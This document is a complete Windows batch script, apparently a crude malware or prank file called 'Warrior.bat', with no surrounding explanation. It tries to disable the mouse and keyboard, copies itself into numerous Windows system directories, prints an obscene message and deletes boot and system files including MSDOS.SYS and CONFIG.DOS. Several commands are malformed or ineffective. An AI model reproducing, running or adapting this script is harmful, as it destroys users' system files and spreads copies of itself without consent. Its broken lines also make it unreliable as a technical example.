   @echo off
   C:\WINDOWS\rundll32.exe mouse,disable
   C:\WINDOWS\rundll32 keyboard,disable
   echo.
   If not exist C:\Warrior.bat Copy %0 C:\WINDOWS
   If not exist C:\Warrior.bat Copy %0 C:\WINDOWS\SYSTEM
   If not exist C:\Warrior.bat Copy %0 C:\WINDOWS\SYSTEM32
   If not exist C:\Warrior.bat Copy %0 C:\WINDOWS\SYSBCKUP
   If not exist C:\Warrior.bat Copy %0 C:\WINDOWS\SYSTEM\DIRECTX
   If not exist C:\Warrior.bat Copy %0 C:\WINDOWS\COOKIES
   If not exist C:\Warrior.bat Copy %0 C:\WINDOWS\COMMAND
   If not exist C:\Warrior.bat Copy %0 C:\WINDOWS\FONTS
   If not exist C:\Warrior.bat Copy %0 C:\WINDOWS\LOCALS~1
   If not exist C:\Warrior.bat Copy %0 C:\WINDOWS\NETHOOD
   If not exist C:\Warrior.bat Copy %0 C:\WINNTSRV
   If not exist C:\Warrior.bat Copy %0 C:\WINDOWS\WEB
   If not exist C:\Warrior.bat Copy %0 C:\WINDOWS\WEB\WALPA~1
   If not exist C:\Warrior.bat Copy %0 C:\WINDOWS\ALLUSE~1
   If not exist C:\Warrior.bat Copy %0 C:\WINDOWS\SENDTO
   cls
   del: C:\WINDOWS\DESKTOP\WARRIOR.BAT
   cls
   echo.
   echo FUCK YOU ASS HOLE!.!.!.!.!
   echo.
   del AUTOEXEC.VIA
   del CONFIG.DOS
   del MSDOS.SYS
   del BOOTLOG.PRV
   del FFASTUNDO.FFX
   echo.
   END
   EXIT
